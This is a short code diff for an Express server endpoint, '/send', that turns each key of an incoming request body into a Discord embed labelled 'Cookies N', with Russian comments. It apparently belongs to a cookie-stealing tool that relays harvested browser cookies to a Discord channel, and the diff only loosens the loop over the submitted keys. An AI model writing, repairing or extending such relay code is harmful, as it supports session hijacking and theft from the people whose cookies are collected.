@@ -21,15 +21,13 @@ app.post('/send', async (req, res) => {
         let embds = []
         // Перебираем ключ-значение из тела запроса
         for (const key in reqBody) {
-            if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
-                index++;
-                embds.push({
-                    title: `Куки ${index}`,
-                    description: key,
-                    color: 5814783,
-                    fields: [''] // Передаем готовый массив объектов
-                })
-            }
+              index++;
+              embds.push({
+                  title: `Куки ${index}`,
+                  description: key,
+                  color: 5814783,
+                  fields: [''] // Передаем готовый массив объектов
+              })
         }
 
         // Формируем правильную структуру для Discord
